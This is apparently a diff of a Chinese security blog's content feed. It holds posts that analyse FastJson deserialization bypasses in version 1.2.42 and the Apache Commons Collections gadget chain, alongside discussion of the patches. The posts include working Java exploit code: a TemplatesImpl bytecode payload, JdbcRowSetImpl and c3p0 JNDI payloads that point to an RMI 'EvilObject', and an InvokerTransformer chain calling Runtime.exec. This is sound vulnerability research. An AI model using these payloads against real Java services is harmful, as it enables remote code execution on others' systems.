6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;rand1&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,</span><br><span class="line">    &quot;jndiName&quot;: &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;,</span><br><span class="line">    &quot;loginTimeout&quot;: 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>通过查看补丁发现，原来根据”@type”的值直接加载类的操作修改为checkAutoType函数了。</p>
 <p><img src="11.png" alt=""></p>
 <p>且默认情况下autoType关闭了，可以看到它会经过一个黑名单判断，从而抛出异常。</p>
@@ -346,44 +340,6 @@
 <li><a href="https://kingx.me/Details-in-FastJson-RCE.html" target="_blank" rel="noopener">FastJson反序列化漏洞利用的三个细节 - TemplatesImpl的利用链</a></li>
 <li><a href="https://www.dazhuanlan.com/2020/02/10/5e40c9b6f1d85/" target="_blank" rel="noopener">FastJson反序列化漏洞分析</a></li>
 <li><a href="https://manning23.github.io/2018/03/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jndi%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">FASTJSON反序列化之基于JNDI利用方式</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>JAVA安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>FastJson反序列化回顾系列(三)</title>
-    <url>/2020/05/16/fastjson-3/</url>
-    <content><![CDATA[<p>上一个回顾中指出了利用<code>L</code>和<code>;</code>来进行绕过。而这次的漏洞是由于上次漏洞的补丁打得太过简单导致可以通过双写<code>LL;;</code>来绕过。这一篇文章讲述的就是这一方式。</p>
-<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
-<li>fastjson = 1.2.42</li>
-</ul>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
-<li>打开autotype</li>
-</ul>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从上次的补丁可以得知以下两点:</p>
-<ul>
-<li>将黑名单变成了hashcode，不好得知具体的类</li>
-<li>将checkAutoType增加了对于<code>L;</code>这种情况的处理</li>
-</ul>
-<p>定位到checkAutoType函数。</p>
-<p><img src="1.png" alt=""></p>
-<p>它仅仅是判断了是否以<code>L</code>开头且以<code>;</code>结尾，如果是这样，就去掉开头的<code>L</code>和结尾的<code>;</code>。很明显可通过双写绕过。</p>
-<p>比较不容易的是对于hashcode这样形式的黑名单，不容易知道真正的黑名单类。</p>
-<blockquote>
-<p>可通过爬取Maven仓库下所有类，然后跑一遍，输出黑名单类。</p>
-</blockquote>
-<h1 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h1><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.42&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.42&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>在1.2.43版本中的补丁中对以<code>LL</code>开头且以<code>;;</code>结尾的情况进行了防御。</p>
-<p><img src="3.png" alt=""></p>
-<p>抛出异常，然后去除开头的<code>L</code>和结尾的<code>;</code>。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">FastJson反序列化的前世今生</a></li>
-<li><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></li>
 </ul>
 ]]></content>
       <categories>
@@ -509,6 +465,44 @@
       </categories>
   </entry>
   <entry>
+    <title>FastJson反序列化回顾系列(三)</title>
+    <url>/2020/05/16/fastjson-3/</url>
+    <content><![CDATA[<p>上一个回顾中指出了利用<code>L</code>和<code>;</code>来进行绕过。而这次的漏洞是由于上次漏洞的补丁打得太过简单导致可以通过双写<code>LL;;</code>来绕过。这一篇文章讲述的就是这一方式。</p>
+<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>fastjson = 1.2.42</li>
+</ul>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
+<li>打开autotype</li>
+</ul>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>从上次的补丁可以得知以下两点:</p>
+<ul>
+<li>将黑名单变成了hashcode，不好得知具体的类</li>
+<li>将checkAutoType增加了对于<code>L;</code>这种情况的处理</li>
+</ul>
+<p>定位到checkAutoType函数。</p>
+<p><img src="1.png" alt=""></p>
+<p>它仅仅是判断了是否以<code>L</code>开头且以<code>;</code>结尾，如果是这样，就去掉开头的<code>L</code>和结尾的<code>;</code>。很明显可通过双写绕过。</p>
+<p>比较不容易的是对于hashcode这样形式的黑名单，不容易知道真正的黑名单类。</p>
+<blockquote>
+<p>可通过爬取Maven仓库下所有类，然后跑一遍，输出黑名单类。</p>
+</blockquote>
+<h1 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h1><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.42&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">templatesimpl3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        String bytes1 = Base64.encodeBase64String(classBytes);</span><br><span class="line">        String NASTY_CLASS = <span class="string">"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;"</span>;</span><br><span class="line">        String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">"\",\"_bytecodes\":[\""</span>+bytes1+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</span><br><span class="line"></span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(text1, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.42&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        config.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>在1.2.43版本中的补丁中对以<code>LL</code>开头且以<code>;;</code>结尾的情况进行了防御。</p>
+<p><img src="3.png" alt=""></p>
+<p>抛出异常，然后去除开头的<code>L</code>和结尾的<code>;</code>。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">FastJson反序列化的前世今生</a></li>
+<li><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>FastJson反序列化回顾系列(五)</title>
     <url>/2020/05/16/fastjson-5/</url>
     <content><![CDATA[<p>1.2.44版本中对<code>L</code>和<code>[</code>开头的情况进行了防御，使得在1.2.44版本时并没有出现任何的checkAutoType的绕过。但是却出现了对于黑名单的绕过。本篇文章对此进行深入的分析。</p>
@@ -542,6 +536,179 @@
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
 <li><a href="https://mntn0x.github.io/2020/04/07/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#1-2-45%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE" target="_blank" rel="noopener">Fastjson漏洞复现</a></li>
 </ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Apache Commons Collections分析</title>
+    <url>/2020/04/20/common-collections/</url>
+    <content><![CDATA[<p>由于java序列化/反序列化的需求，开发过程中常使用一些公共库。Apache Commons Collections是一个扩展了java标准库里的Collection结构的第三方基础库。它为Java提供了很多基础常用且强大的数据结构，方便开发。这个组件出现反序列化问题，由于很多类引起的。这里介绍其中一种方式的原理，与<font color=#008000><code>TransformedMap</code></font>和<font color=#008000><code>InvokerTransformer</code></font>有关。</p>
+<a id="more"></a>
+
+
+
+<h2 id="关键类介绍"><a href="#关键类介绍" class="headerlink" title="关键类介绍"></a>关键类介绍</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p><code>TransformerdMap</code>这个类是用来对Map进行某些变换用的。当一个元素被<font color=ff0000><code>添加/删除/修改</code></font>过时，会自动调用<code>tranform</code>方法自动进行特定的修饰变换，变换的逻辑由Transformer类定义。</p>
+<p>通过decorate函数可以将一个普通的<code>Map</code>转换为一个<code>TransformedMap</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map transformedMap &#x3D; TransformedMap.decorate(map,keyTansformer,valueTransformer);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>第二个参数和第三个参数分别对应于当Map中的key和value改变时需要做的操作。</p>
+</blockquote>
+<h3 id="Tranformer"><a href="#Tranformer" class="headerlink" title="Tranformer"></a>Tranformer</h3><p><code>Transformer</code>是一个接口，实现<code>transform(Object input)</code>方法即可进行实际的变换操作，上述代码若修改了其中的任意key或value，都会调用<code>tranform</code>方法进行变换操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">	new ConstantTransformer(...);</span><br><span class="line">	new InvokerTransformer(...)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer chainedTransformer &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">Map transMap &#x3D; TransformedMap.decorate(rawMap,null,chainedTransformer);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>若想进行一系列的变换操作，可以通过定义一个chainedTransformer来实现，只需要传入一个Transformer数组即可。</p>
+</blockquote>
+<p>ChainedTranformer的工作原理很简单，将上一个变换的结果作为下一次变换的输入，直到左右的变换完成，并返回最终的object。Commons Collections内置了许多常见的transformer，无需手工编写，其中InvokerTransformer可以通过调用Java反射机制来调用任意函数。</p>
+<h2 id="构造chainedTransformer"><a href="#构造chainedTransformer" class="headerlink" title="构造chainedTransformer"></a>构造chainedTransformer</h2><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>相当于<code>Transformer</code>的一种。观察它的<code>tranform</code>函数，如下所示:</p>
+<p>org/apache/commons/collections/functors/InvokerTransformer.class<br><img src="1.png" alt=""></p>
+<p>从图上可知，关键部分在于通过<code>getClass()</code>、<code>getMethod()</code>以及<code>invoke()</code>来进行反射，查找并调用给定的方法。InvokerTransformer接受3个参数，分别是调用方法的名称，参数类型，调用参数。参数类型要对应于调用方法所指定的参数类型。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>内置的<code>ConstantTranformer</code>类可以获取到特定的类。<br><img src="2.png" alt=""></p>
+<h3 id="构造链"><a href="#构造链" class="headerlink" title="构造链"></a>构造链</h3><p>在构造的chain中，最终的实现类似于</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((Runtime) Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()).exec(&quot;ifconfig&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>因此第一步是获取到Runtime类，通过内置的<code>ConstantTransformer</code>来获取，然后通过<code>InvokerTransformer</code>来反射调用getMethod方法，参数是getRuntime，以此来获取到<code>Runtime.getRuntime</code>。以此类推，构造出调用invoke和exec的<code>InvokerTransformer</code>，整个chain就结束了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[] &#123;</span><br><span class="line">new ConstantTransformer(Runtime.class),</span><br><span class="line">new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125;),</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;, new Object[] &#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformChain &#x3D; new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>构造完这样的一个chain之后，只需要将一个<code>Map</code>类型的数据转换为<code>TransformedMap</code>，然后对其中的key,value进行操作，即可达到反序列化命令执行。可新建一个test.java进行测试。</p>
+<p>test.java</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformer &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&quot;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">	Transformer transformedChain &#x3D; new ChainedTransformer(transformer);</span><br><span class="line"></span><br><span class="line">	Map&lt;String,String&gt; beforetransMap &#x3D; new HashMap&lt;String,String&gt;();</span><br><span class="line">	beforetransMap.put(&quot;name&quot;,&quot;ananaskr&quot;);</span><br><span class="line">        </span><br><span class="line">	Map transformedMap &#x3D; TransformedMap.decorate(beforetransMap,transformedChain,transformedChain);</span><br><span class="line"></span><br><span class="line">	Map.Entry onlyElement &#x3D; (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(&quot;ananaskr1&quot;);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下:<br><img src="3.png" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener">Apache-Commons-Collections反序列化漏洞分析</a></li>
+<li><a href="https://javasec.org/javase/JavaDeserialization/Collections.html" target="_blank" rel="noopener">Apache Commons Collections反序列化漏洞</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>FastJson反序列化介绍</title>
+    <url>/2020/05/20/fastjson-introduction/</url>
+    <content><![CDATA[<p>之前虽然看了FastJson相关的内容，在复现的时候还是遇到了不少问题。因为比较详细地分析了下FastJson反序列化的过程，因此，记录了下来。</p>
+<a id="more"></a>
+
+<h2 id="FastJson简介"><a href="#FastJson简介" class="headerlink" title="FastJson简介"></a>FastJson简介</h2><p>FastJson自己实现了一套反序列化的机制，并没有使用默认的readObject()，在序列化反序列化的时候会进行一些操作，调用到一些setter和getter函数，从而造成命令执行。</p>
+<h3 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h3><ul>
+<li>序列化<ul>
+<li>JSON.toJSONString()</li>
+</ul>
+</li>
+<li>反序列化<ul>
+<li>JSON.parse()   返回实际类型对象</li>
+<li>JSON.parseObject()   返回JSONObject类型对象</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>FastJson中提供特殊字段符<code>@type</code>。该字段可以指定反序列化任意类，并在反序列化过程中自动调用类中属性的公有的set、get、is方法。(这个is方法有待验证)</p>
+</blockquote>
+<p>根据很多的实验可知，反序列化的规律:</p>
+<ul>
+<li>该类的无参构造函数被调用</li>
+<li>public修饰的属性直接反序列化成功</li>
+<li>private修饰的属性调用setter方法进行赋值</li>
+<li>getter函数会根据函数返回值不同，选择被调用或不被调用</li>
+</ul>
+<blockquote>
